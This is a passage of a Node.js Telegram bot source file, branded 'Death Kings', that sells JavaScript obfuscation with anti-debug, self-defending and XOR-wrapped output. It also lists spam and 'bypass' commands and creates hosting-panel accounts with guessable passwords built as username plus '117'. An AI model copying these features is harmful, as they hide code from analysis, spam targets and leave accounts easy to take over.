const { Telegraf } = require("telegraf");
const fs = require("fs-extra");
const path = require("path");
const JsConfuser = require("js-confuser");
const settings = require("./settings");
const config = require("./config");
const axios = require('axios');
const { webcrack } = require("webcrack");
const crypto = require("crypto");
const { Client } = require('ssh2');
const FileType = require("file-type");
const FormData = require("form-data");
const AdmZip = require("adm-zip");
const { URL } = require("url");
const moment = require('moment');
const os = require("os");
const yts = require("yt-search");
const https = require("https");
const fetch = require("node-fetch");
const archiver = require("archiver");
const chalk = require("chalk");

const historyFile = path.join(__dirname, "aiHistory.json");
const aiStatusFile = path.join(__dirname, "aiStatus.json");
const bot = new Telegraf(config.BOT_TOKEN);
const userData = {};
const userState = {};
const { BOT_TOKEN, ADMIN_ID } = require("./config.js");

const {
  GITHUB_OWNER,
  GITHUB_REPO,
  GITHUB_TOKEN,
  GITHUB_PRODUK_PATH,
  GITHUB_PATH,
  GITHUB_TOKENS_FILE,
  QRIS_URL,
  OPENAI_API_KEY,
  VERCEL_TOKEN,
  domain,
  plta,
  pltc,
  eggs,
  loc
} = require("./settings");
const orderFile = "./database/orders.json";
const barangFile = "./database/produk.json";

const log = () => {
    console.log(
        "\x1b[32m✅️ Bot Berhasil dijalankan\x1b[0m\n" +
        "\x1b[36mScript MD Death Kings berjalan...🚀\x1b[0m"
    );
};

// Path untuk file JSON
const USERS_FILE = "./database/users.json";
const antiLinkStatus = {};

const GITHUB_BLACKLIST_PATH = "blacklist.json";
const GITHUB_BRANCH = "main";

function getServerId() {
  return (
    process.env.SERVER_ID ||
    process.env.PTERODACTYL_SERVER_ID ||
    process.env.PTERODACTYL_UUID ||
    process.env.PTERODACTYL_INSTANCE ||
    os.hostname()
  );
}

const SERVER_ID = getServerId();
console.log(chalk.blue("🔍 SERVER ID TERDETEKSI:", SERVER_ID));

const CACHE_FILE = path.join(__dirname, "member_cache.json");
let memberCache = fs.existsSync(CACHE_FILE) ? JSON.parse(fs.readFileSync(CACHE_FILE)) : {};

const MAX_ALLTAG = 300;
const MAX_SPAM = 50;
const MAX_HTML_SNIPPET = 3000;
const MAX_FILES = 800;
const FETCH_TIMEOUT = 25000;
const SEND_DELAY = 1100;

let antiPromosi = {}; 

/* ===== Helper ===== */
function escapeHtml(s) {
  return (s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// --- Fungsi helper untuk cek membership ---
async function isMember(ctx, chatId) {
  try {
    const member = await ctx.telegram.getChatMember(chatId, ctx.from.id);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) {
    console.error("Gagal cek membership:", chatId, err.description || err.message);
    return false;
  }
}

// Cek apakah user adalah admin
async function isAdmin(ctx) {
    try {
        const member = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
        return ["administrator", "creator"].includes(member.status);
    } catch (err) {
        console.error("Gagal cek admin:", err);
        return false;
    }
}

async function CatBox(filePath) {
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('userhash', '');
    form.append('fileToUpload', fs.createReadStream(filePath));

    try {
        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });
        return response.data;
    } catch (error) {
        console.error("Gagal upload ke CatBox:", error.message);
        return null;
    }
}

function getFileExtension(contentType) {
    const types = {
        'image/jpeg': '.jpg',
        'image/jpg': '.jpg',
        'image/png': '.png',
        'image/gif': '.gif',
        'video/mp4': '.mp4',
        'video/quicktime': '.mov',
        'audio/mpeg': '.mp3',
        'audio/ogg': '.ogg',
        'application/pdf': '.pdf',
        'application/zip': '.zip'
    };
    return types[contentType] || '.bin';
}

function sanitizeFilename(name) {
  return name.replace(/[#?<>:"\/\\|*\x00-\x1F]/g, "_").slice(0, 200) || "file";
}

function isWantedFile(url) {
  const cleanUrl = url.split("?")[0].split("#")[0];
  return /\.(js|css|html?)$/i.test(cleanUrl);
}

function resolveResourceUrl(base, resource) {
  try {
    if (!resource) return null;
    const trimmed = resource.trim();
    if (/^\s*data:/i.test(trimmed)) return null;
    if (trimmed.startsWith("//")) {
      const u = new URL(base);
      return u.protocol + trimmed;
    }
    if (/^https?:\/\//i.test(trimmed)) return trimmed;
    return new URL(trimmed, base).toString();
  } catch (e) {
    return null;
  }
}
async function fetchArrayBuffer(url) {
  const r = await axios.get(url, {
    responseType: "arraybuffer",
    timeout: FETCH_TIMEOUT,
    maxRedirects: 5,
    validateStatus: () => true
  });
  if (!(r.status >= 200 && r.status < 400)) {
    const err = new Error("bad_status");
    err.response = r;
    throw err;
  }
  return { data: r.data, contentType: r.headers["content-type"] || "" };
}

function parseCssForResources(cssText) {
  const found = new Set();
  if (!cssText) return [];
  const urlRe = /url\(([^)]+)\)/gi;
  let m;
  while ((m = urlRe.exec(cssText))) {
    let val = m[1].trim().replace(/^['"]|['"]$/g, "");
    if (val) found.add(val);
  }

  const impRe = /@import\s+(?:url\()?['"]?([^'")]+)['"]?\)?;/gi;
  while ((m = impRe.exec(cssText))) {
    let val = (m[1] || "").trim();
    if (val) found.add(val);
  }
  return Array.from(found);
}

async function downloadFile(url, saveDir, i = 0) {
  const { data, contentType } = await fetchArrayBuffer(url);
  let filename = new URL(url).pathname.split("/").pop() || `file_${i}`;
  filename = sanitizeFilename(filename);
  const savePath = path.join(saveDir, filename);
  fs.writeFileSync(savePath, Buffer.from(data));

  if (contentType.includes("css") || filename.endsWith(".css")) {
    const text = data.toString("utf8");
    const cssUrls = [];
    const regex = /url\(([^)]+)\)/gi;
    let m;
    while ((m = regex.exec(text))) {
      let u = m[1].trim().replace(/^['"]|['"]$/g, "");
      const full = resolveResourceUrl(url, u);
      if (full) cssUrls.push(full);
    }
    const importRegex = /@import\s+(?:url\()?['"]?([^'")]+)['"]?\)?/gi;
    while ((m = importRegex.exec(text))) {
      const full = resolveResourceUrl(url, m[1]);
      if (full) cssUrls.push(full);
    }
    return { path: savePath, more: cssUrls };
  }

  return { path: savePath, more: [] };
}

// === Helper bikin server ===
async function createServer(ctx, username, targetId, name, memo, cpu, disk) {
  const email = `${username}@buyer.com`;
  const password = `${username}117`;
  let user, server;

  try {
    const resUser = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: "en",
        password,
      }),
    });
    const dataUser = await resUser.json();
    if (dataUser.errors) {
      return ctx.reply(`❌ Error User:\n${JSON.stringify(dataUser.errors[0], null, 2)}`);
    }
    user = dataUser.attributes;

    // Buat server
    const resServer = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name,
        description: "",
        user: user.id,
        egg: parseInt(eggs),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: "if [ -f /home/container/package.json ]; then npm install; fi; npm start",
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: { memory: memo, swap: 0, disk: disk, io: 500, cpu: cpu },
        feature_limits: { databases: 5, backups: 5, allocations: 1 },
        deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
      }),
    });
    const dataServer = await resServer.json();
    if (dataServer.errors) {
      return ctx.reply(`❌ Error Server:\n${JSON.stringify(dataServer.errors[0], null, 2)}`);
    }
    server = dataServer.attributes;
    
    await ctx.telegram.sendMessage(
  targetId,
  `🔥 PANEL BARU TELAH DIBUAT 🔥\n\n` +
  `📛 Nama: ${username}\n` +
  `📧 Email: ${email}\n` +
  `🆔 ID Server: ${server.id}\n` +
  `💾 RAM: ${memo === "0" ? "Unlimited" : memo + " MB"}\n` +
  `💽 Disk: ${disk === "0" ? "Unlimited" : disk + " MB"}\n` +
  `🖥 CPU: ${cpu === "0" ? "Unlimited" : cpu + "%"}\n\n` +
  `🔑 Login: ${domain}\n` +
  `👤 Username: ${user.username}\n` +
  `🔒 Password: ${password}`
);

await ctx.reply("✅ Data panel berhasil dikirim ke target.");
  } catch (err) {
    console.error("CREATE SERVER ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat membuat server.");
  }
}

// FUNGSI CMD /PLAY
const txt = (ctx) => (ctx.message?.text || ctx.message?.caption || "").trim();

const urlFrom = (ctx) => {
  const t = txt(ctx);
  const e = ctx.message?.entities || ctx.message?.caption_entities || [];
  const u = e.find(v => v.type === "url");
  if (u) return t.slice(u.offset, u.offset + u.length);
  const tl = e.find(v => v.type === "text_link");
  if (tl?.url) return tl.url;
  const r = /(https?:\/\/[^\s]+|youtu\.be\/[^\s]+)/i.exec(t);
  return r ? r[0] : "";
};

const fail = async (ctx, tag, err) => {
  try {
    const name = err?.name || "";
    const code = err?.code || "";
    const status = err?.response?.status || "";
    const statusText = err?.response?.statusText || "";
    const msg = err?.message || "";
    const apiMsg = typeof err?.response?.data === "string"
      ? err.response.data.slice(0, 300)
      : JSON.stringify(err?.response?.data || {}, null, 0).slice(0, 300);

    await ctx.reply(`❌ ${tag}\n• name: ${name}\n• code: ${code}\n• status: ${status} ${statusText}\n• msg: ${msg}\n• body: ${apiMsg}\n© ᴏᴛᴀx (⸙)`);
  } catch (e) {
    console.error("Fail handler error:", e);
  }
};

const topVideos = async (q) => {
  try {
    const r = await yts.search(q);
    return (r.videos || [])
      .filter(v => !v.live && v.seconds > 0 && v.seconds <= 1200)
      .slice(0, 5)
      .map(v => ({ url: v.url, title: v.title, author: v.author?.name || "YouTube" }));
  } catch (e) {
    console.error("topVideos error:", e);
    return [];
  }
};

const fetchMp3 = async (ytUrl) => {
  try {
    const api = `https://api.vreden.my.id/api/ytmp3?url=${encodeURIComponent(ytUrl)}`;
    const r = await axios.get(api, { timeout: 60000, validateStatus: () => true });
    if (r.status < 200 || r.status >= 300) {
      const e = new Error("api_bad_status"); e.response = r; throw e;
    }
    const d = r.data?.result;
    const u = d?.download?.url;
    if (!u) {
      const e = new Error("api_no_download_url"); e.response = { status: r.status, data: r.data }; throw e;
    }
    return {
      dlink: u,
      title: d?.metadata?.title || "YouTube Audio",
      author: d?.metadata?.author?.name || "YouTube"
    };
  } catch (e) {
    console.error("fetchMp3 error:", e);
    throw e;
  }
};

const download = async (url, out) => {
  try {
    const res = await axios.get(url, {
      responseType: "stream",
      timeout: 120000,
      maxRedirects: 5,
      headers: {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Referer": "https://youtube.com/"
      },
      validateStatus: s => s >= 200 && s < 400
    });
    const w = fs.createWriteStream(out);
    res.data.pipe(w);
    await new Promise((resolve, reject) => { w.on("finish", resolve); w.on("error", reject); });
    return out;
  } catch (e) {
    console.error("download error:", e);
    throw e;
  }
};

const groupFile = "./database/grub.json";

// Baca grup/channel dari file
function loadGroups() {
  if (!fs.existsSync(groupFile)) return [];
  return JSON.parse(fs.readFileSync(groupFile));
}

// Simpan ke file
function saveGroups(groups) {
  fs.writeFileSync(groupFile, JSON.stringify(groups, null, 2));
}

// === Bot ditambahkan ke grup ===
bot.on("new_chat_members", async ctx => {
  const newMembers = ctx.message.new_chat_members;
  const botId = (await ctx.telegram.getMe()).id;

  if (newMembers.find(m => m.id === botId)) {
    const groups = loadGroups();
    const chatId = ctx.chat.id;

    if (!groups.includes(chatId)) {
      groups.push(chatId);
      saveGroups(groups);

      ctx.reply("✅ Bot berhasil ditambahkan. ID grup tersimpan otomatis.");
      console.log(`[GRUP] Bot ditambahkan ke grup: ${chatId}`);
    }
  }
});

// === Bot ditambahkan ke channel (sebagai admin) ===
bot.on("my_chat_member", async ctx => {
  const chat = ctx.chat;
  const newStatus = ctx.update.my_chat_member.new_chat_member.status;
  const botId = (await ctx.telegram.getMe()).id;

  if (chat.type === "channel" && newStatus === "administrator") {
    const groups = loadGroups();
    if (!groups.includes(chat.id)) {
      groups.push(chat.id);
      saveGroups(groups);

      console.log(`[CHANNEL] Bot ditambahkan ke channel: ${chat.id}`);
    }
  }

  if (chat.type === "channel" && (newStatus === "left" || newStatus === "kicked")) {
    let groups = loadGroups();
    if (groups.includes(chat.id)) {
      groups = groups.filter(id => id !== chat.id);
      saveGroups(groups);

      console.log(`[CHANNEL] Bot dihapus dari channel: ${chat.id}`);
    }
  }
});

// === Bot keluar/dikeluarkan dari grup ===
bot.on("left_chat_member", async ctx => {
  const leftMember = ctx.message.left_chat_member;
  const botId = (await ctx.telegram.getMe()).id;

  if (leftMember.id === botId) {
    let groups = loadGroups();
    const chatId = ctx.chat.id;

    if (groups.includes(chatId)) {
      groups = groups.filter(id => id !== chatId);
      saveGroups(groups);

      console.log(`[GRUP] Bot dikeluarkan dari grup: ${chatId}`);
    }
  }
});

// Fungsi untuk memuat pengguna dari JSON
function loadUsers() {
    try {
        if (fs.existsSync(USERS_FILE)) {
            const data = fs.readFileSync(USERS_FILE, "utf-8");
            return new Set(JSON.parse(data));
        }
        return new Set();
    } catch (error) {
        log("Gagal memuat pengguna dari JSON", error);
        return new Set();
    }
}

// Fungsi untuk menyimpan pengguna ke JSON
function saveUsers(users) {
    try {
        fs.writeFileSync(USERS_FILE, JSON.stringify([...users], null, 2));
    } catch (error) {
        log("Gagal menyimpan pengguna ke JSON", error);
    }
}

// Muat pengguna saat bot dimulai
let users = loadUsers();

// --- Function cek membership umum ---
async function checkMembership(ctx, chatId) {
    try {
        const chatMember = await ctx.telegram.getChatMember(chatId, ctx.from.id);
        return ["member", "administrator", "creator"].includes(chatMember.status);
    } catch (error) {
        console.error(`Gagal memeriksa keanggotaan ${chatId}:`, error.message);
        return false;
    }
}

// --- Function cek channel & group wajib ---
async function checkChannelAndGroup(ctx) {
    const channelId = "@Death_kings01";
    const groupId   = "@Death_kings10";

    const isChannelMember = await checkMembership(ctx, channelId);
    const isGroupMember   = await checkMembership(ctx, groupId);

    return { isChannelMember, isGroupMember };
}

// Konstanta fungsi async untuk obfuscation Time-Locked Encryption
const obfuscateTimeLocked = async (fileContent, days) => {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryTimestamp = expiryDate.getTime();
    try {
        const obfuscated = await JsConfuser.obfuscate(
            `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: "randomized",
                stringCompression: true,
                stringConcealing: true,
                stringEncoding: true,
                controlFlowFlattening: 0.75,
                flatten: true,
                shuffle: true,
                rgf: false,
                opaquePredicates: {
                    count: 6,
                    complexity: 4
                },
                dispatcher: true,
                globalConcealing: true,
                lock: {
                    selfDefending: true,
                    antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
                    integrity: true,
                    tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
                },
                duplicateLiteralsRemoval: true
            }
        );
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

// Command /enclocked untuk enkripsi dengan masa aktif dalam hari

// Konstanta fungsi async untuk obfuscation Quantum Vortex Encryption
const obfuscateQuantum = async (fileContent) => {
    // Generate identifier unik berdasarkan waktu lokal
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let identifier = "qV_";
        for (let i = 0; i < 7; i++) {
            identifier += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        }
        return identifier;
    };

    // Tambahkan kode phantom berdasarkan milidetik
    const currentMilliseconds = new Date().getMilliseconds();
    const phantomCode = currentMilliseconds % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";

    try {
        const obfuscated = await JsConfuser.obfuscate(fileContent + phantomCode, {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            stringCompression: true,
            stringConcealing: false,
            stringEncoding: true,
            controlFlowFlattening: 0.85, // Intensitas lebih tinggi untuk versi 2.0
            flatten: true,
            shuffle: true,
            rgf: true,
            opaquePredicates: {
                count: 8, // Peningkatan count untuk versi 2.0
                complexity: 5
            },
            dispatcher: true,
            globalConcealing: true,
            lock: {
                selfDefending: true,
                antiDebug: (code) => `if(typeof debugger!=='undefined'||(typeof process!=='undefined'&&process.env.NODE_ENV==='debug'))throw new Error('Debugging disabled');${code}`,
                integrity: true,
                tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
            },
            duplicateLiteralsRemoval: true
        });
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        // Self-evolving code dengan XOR dinamis
        const key = currentMilliseconds % 256;
        obfuscatedCode = `(function(){let k=${key};return function(c){return c.split('').map((x,i)=>String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('');}('${obfuscatedCode}');})()`;
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

const getSiuCalcrickObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

const getNebulaObfuscationConfig = () => {
    const generateNebulaName = () => {
        // Identifier generator pseudo-random tanpa crypto atau timeHash
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const prefix = "NX";
        let randomPart = "";
        for (let i = 0; i < 4; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `${prefix}${randomPart}`;
    };

    return {
        target: "node",
        compact: true,                  
        renameVariables: true,          
        renameGlobals: true,            
        identifierGenerator: generateNebulaName,
        stringCompression: true,        
        stringConcealing: false,        
        stringEncoding: true,          
        stringSplitting: false,         
        controlFlowFlattening: 0.75,    
        flatten: true,                 
        shuffle: true,               
        rgf: true,                    
        deadCode: true,               
        opaquePredicates: true,        
        dispatcher: true,              
        globalConcealing: true,        
        objectExtraction: true,        
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,       
            antiDebug: true,          
            integrity: true,          
            tamperProtection: true     
        }
    };
};

const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        return "var_" + Math.random().toString(36).substring(7);
    };

    return {
        target: "node",
        calculator: false,
        compact: true,
        controlFlowFlattening: 1,
        deadCode: 1,
        dispatcher: true,
        duplicateLiteralsRemoval: 1,
        es5: true,
        flatten: true,
        globalConcealing: true,
        hexadecimalNumbers: 1,
        identifierGenerator: generateNovaName,
        lock: {
            antiDebug: true,
            integrity: true,
            selfDefending: true,
        },
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: true,
        renameGlobals: true,
        renameVariables: true,
        shuffle: true, 
        stack: true,
        stringCompression: true,
        stringConcealing: true,
    };
};

const getStrongObfuscationConfig = () => {
    return {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
    };
};

const getArabObfuscationConfig = () => {
    const arabicChars = [
        "أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي"
    ];

    const generateArabicName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateArabicName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const getJapanxArabObfuscationConfig = () => {
    const japaneseXArabChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん" 
    ];

    const generateJapaneseXArabName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseXArabName(),
        stringCompression: true, // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string        
        controlFlowFlattening: 0.95, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        rgf: false,
        dispatcher: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const getJapanObfuscationConfig = () => {
    const japaneseChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ",
        "ら", "り", "る", "れ", "ろ", "わ", "を", "ん"
    ];

    const generateJapaneseName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Progress bar
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// Update progress
async function updateProgress(ctx, message, percentage, status) {
    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    try {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            message.message_id,
            null,
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "PROSES ENCRYPT",
            { parse_mode: "Markdown" }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        log("Gagal memperbarui progres", error);
    }
}


// ==== /start =====
bot.start(async (ctx) => {

    users.add(ctx.from.id);
    saveUsers(users);

    const userName = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const userId = ctx.from.id;

    await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

    setTimeout(async () => {
    
        await ctx.replyWithPhoto("https://files.catbox.moe/lker0z.jpg", {
            caption: `
\`\`\`
╭━━━━( 𝐃𝐄𝐀𝐓𝐇 𝐊𝐈𝐍𝐆𝐒 )━━━━╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : 𝐒𝐂 𝐌𝐃 𝐃𝐄𝐀𝐓𝐇 𝐂𝐑𝐀𝐒𝐇
│友 ᴠᴇʀsɪᴏɴ : 3.0
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Death_co
╰━━━━━━━━━━━━━━━━━━━━━━╯
╭━━━( 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 )━━━━╮
│• Username : ${userName}
│• ID-User : ${userId}
╰━━━━━━━━━━━━━━━━━━━╯

• /lapor <text> -> Untuk Melaporkan \nJika Ada Yang Error
\`\`\``,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔐 Menu Enc", callback_data: "menu_enc" },
                         { text: "⚙️ Menu Tools", callback_data: "menu_tools" }
                    ],
                    [
                          { text: "👥️️ Menu Group", callback_data: "menu_group" },
                          { text: "️💾 Menu Panel", callback_data: "menu_panel" }
                    ],
                    [
                           { text: "️📢 Menu Jasher", callback_data: "menu_jasher" },
                           { text: "️🛒 Menu Store", callback_data: "menu_store" }
                    ],
                    [
                          { text: "🔑 MENU ADDB", callback_data: "menu_add" },
                          { text: "️👑 Menu Admin", callback_data: "menu_admin" }
                    ],
                    [    
                          { text: "💳 Payment", callback_data: "menu_pay" }
                    ],
                    [    
                          { text: "Developer", url: "https://t.me/Death_co" }
                    ]
                ]
            }
        });
    }, 100);
});

bot.action("menu_enc", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU ENC )━━━━╮
│ /enclock [ Set Expired ]
│ /encinvis [ Invisible ]
│ /encquantum [ Hard ]
│ /encchina [ Chinese ]
│ /encarab [ Arab ]
│ /encsiu [ Siu ]
│ /encnebula [ Nebula ]
│ /encvar [ Var ]
│ /enceval [ Eval ]
│ /enchtml [ Base64 ]
╰━━━━━━━━━━━━━━━━━━╯
╭━━━( MENU BYPASS )━━━╮
│ /bypass 
╰━━━━━━━━━━━━━━━━━━╯
╭━( MENU ANTI-BYPASS )━╮
│ /antibypass
│ /superantibypass
│ /injectantibypass ( anti crack \n+ bypass )
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {
      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);

        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_enc:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_tools", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU TOOLS )━━━━╮
│ /tourl
│ /info
│ /getcode HTML <url>
│ /getcmd <nama cmd>
│ /spam <jumlah> Teks
│ /cweb -> Create Web Free
│ /play <nama lagu>
│ /cekidch <url tele>
│ /paptt <jumlah> < ID target >
│ /open -> untuk membuka kode isi file
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
